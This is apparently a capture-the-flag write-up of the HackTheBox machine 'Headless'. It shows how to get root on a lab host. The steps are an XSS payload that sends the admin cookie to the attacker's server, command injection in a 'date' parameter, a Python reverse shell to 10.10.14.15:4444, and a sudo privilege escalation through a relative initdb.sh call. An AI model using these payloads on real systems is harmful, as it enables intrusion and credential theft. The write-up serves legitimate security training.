I started an NMAP scan : 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 10:25 CEST
Stats: 0:01:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 10:28 (0:01:27 remaining)
Nmap scan report for headless.htb (10.10.11.8)
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Fri, 05 Apr 2024 08:25:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.57 seconds


We can see that there is a cookie named 'is_admin' in the headers of the http request. Seems interesting. Let's start a folder fuzzing with ffuf :

FFUF scan gave me two pages :

- /support - http 200 ok
- dashboard - http 500 denied

After analyzing support page, we can see that the form header also contain the 'is_admin' cookie. Let's try to do some xxs here.

So we can grab admin cookies with an XSS :

(setup a http server with python3):
┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Headless]
└──╼ [★]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


Then we execute our payload in burpsuite :

<img src=cacapipi onerror=fetch('http://10.10.14.15:8000/'+document.cookie)>

<insert burpsuite image>

┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Headless]
└──╼ [★]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.8 - - [30/Apr/2024 07:34:14] code 404, message File not found
10.10.11.8 - - [30/Apr/2024 07:34:14] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -


So now, we can try to access the admin dashboard with our solen cookie :

GET /dashboard HTTP/1.1
Host: headless.htb:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

<insert image of burpsuite2 with stolen cookie header>

And here we go ! Let's see what the dashboard contains :

<insert image dashboard3>

Ok so basically, what do we have here ?
By analyzing the post request that we can send by clicking on the "Generate report" button, we can see this post parameter :

<insert image burpsuite4>

The 'date' post parameter seems suspect. Let's try differents things :

by adding ;command after the date, we can see that our injected command work perfectly.

<insert image of burpsuite5>

By adding the "id" os command after the date, i saw that we are the user 'dvir'

User: dvir

Let's get a more reliable access to the machine by getting a reverse shell :

python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

<insert image of burpsuite6>

┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Headless]
└──╼ [★]$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.8] 50324
$ id
id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
dvir@headless:~/app$ 

And we succesfully got a shell guys !
Now, we can display the user flag :

dvir@headless:~/app$ cd ..
dvir@headless:~$ ls
app  geckodriver.log  user.txt
dvir@headless:~$ cat user.txt
cat user.txt
REDACTED


Okay so, what's next ?

Firstly, let's check sudo permissions :

dvir@headless:~/app$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
dvir@headless:~/app$ 

It seems like we have root rights to execute syscheck command.

Let's dislay the content of the file :

dvir@headless:~/app$ cat /usr/bin/syscheck

#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

interesting... I checked on internet and I found this article :

https://medium.com/@adiamond186/usr-bin-syscheck-is-looking-for-the-initdb-sh-609cd006d913

which basically say that the initdb.sh file is executed as root.

So I added the /tmp folder in the $PATH variable :

dvir@headless:~/app$ export PATH=/tmp:$PATH
dvir@headless:~/app$ cd /tmp
dvir@headless:/tmp$ touch initdb.sh

Then i moved in the /tmp folder, i created an initdb.sh file and wrote this into it :

dvir@headless:/tmp$ echo '/bin/bash -p' > initdb.sh

Then I gave all permissions to this file :

dvir@headless:/tmp$ chmod 777 initdb.sh

And I executed the syscheck file as root :

dvir@headless:/tmp$ sudo syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.01, 0.05, 0.03
Database service is not running. Starting it...

$ id
uid=0(root) gid=0(root) groups=0(root)

And boom ! Root access !